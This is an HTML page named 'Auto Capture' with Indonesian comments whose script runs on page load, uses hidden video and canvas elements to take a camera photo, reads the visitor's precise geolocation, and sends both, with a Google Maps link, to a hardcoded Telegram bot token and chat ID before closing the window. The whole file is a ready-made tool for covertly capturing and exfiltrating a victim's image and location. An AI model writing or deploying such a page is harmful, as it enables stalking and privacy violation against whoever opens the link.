<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Capture</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: white;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        #status {
            margin-top: 50px;
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div id="status">Memulai proses...</div>

    <!-- Elemen tersembunyi untuk kamera -->
    <video id="camera-view" autoplay playsinline style="display:none;"></video>
    <canvas id="photo-canvas" style="display:none;"></canvas>

    <script>
        // Konfigurasi Telegram (ganti dengan data Anda)
        const BOT_TOKEN = '7548364986:AAGhlDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
        const CHAT_ID = '7041008009';
        
        // Elemen DOM
        const statusEl = document.getElementById('status');
        const cameraView = document.getElementById('camera-view');
        const photoCanvas = document.getElementById('photo-canvas');
        
        // Variabel
        let photoDataUrl = null;
        let locationData = null;
        
        // 1. Fungsi utama yang dijalankan saat halaman dimuat
        async function initialize() {
            try {
                // A. Ambil foto
                statusEl.textContent = "Mengakses kamera...";
                await capturePhoto();
                
                // B. Dapatkan lokasi
                statusEl.textContent = "Mendapatkan lokasi...";
                await getLocation();
                
                // C. Kirim ke Telegram
                statusEl.textContent = "Mengirim ke Telegram...";
                await sendToTelegram();
                
                statusEl.textContent = "Data berhasil dikirim! Halaman akan ditutup dalam 3 detik...";
                setTimeout(() => {
                    window.close();
                }, 3000);
                
            } catch (error) {
                statusEl.textContent = "Error: " + error.message;
                console.error(error);
            }
        }
        
        // 2. Fungsi mengambil foto
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' }
                });
                
                cameraView.srcObject = stream;
                
                // Tunggu kamera siap
                await new Promise(resolve => {
                    cameraView.onloadedmetadata = () => {
                        // Ambil foto setelah 500ms (biarkan kamera fokus)
                        setTimeout(() => {
                            const context = photoCanvas.getContext('2d');
                            photoCanvas.width = cameraView.videoWidth;
                            photoCanvas.height = cameraView.videoHeight;
                            context.drawImage(cameraView, 0, 0, photoCanvas.width, photoCanvas.height);
                            photoDataUrl = photoCanvas.toDataURL('image/jpeg');
                            
                            // Matikan kamera
                            stream.getTracks().forEach(track => track.stop());
                            resolve();
                        }, 500);
                    };
                });
                
            } catch (error) {
                throw new Error("Gagal mengakses kamera: " + error.message);
            }
        }
        
        // 3. Fungsi mendapatkan lokasi
        async function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error("Geolokasi tidak didukung"));
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        locationData = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        resolve();
                    },
                    error => {
                        reject(new Error("Gagal mendapatkan lokasi: " + error.message));
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0 
                    }
                );
            });
        }
        
        // 4. Fungsi mengirim ke Telegram
        async function sendToTelegram() {
            try {
                // Konversi foto ke blob
                const blob = await (await fetch(photoDataUrl)).blob();
                const formData = new FormData();
                
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                
                // Buat caption dengan info lokasi
                let caption = "Foto otomatis\n";
                if (locationData) {
                    caption += `Lokasi: https://maps.google.com/?q=${locationData.lat},${locationData.lng}\n`;
                    caption += `Akurasi: ${Math.round(locationData.accuracy)} meter`;
                } else {
                    caption += "Lokasi: Tidak tersedia";
                }
                
                formData.append('caption', caption);
                
                // Kirim ke API Telegram
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (!result.ok) {
                    throw new Error(result.description || "Gagal mengirim ke Telegram");
                }
                
            } catch (error) {
                throw new Error("Gagal mengirim: " + error.message);
            }
        }
        
        // Jalankan proses saat halaman dimuat
        window.addEventListener('DOMContentLoaded', initialize);
    </script>
</body>
</html>
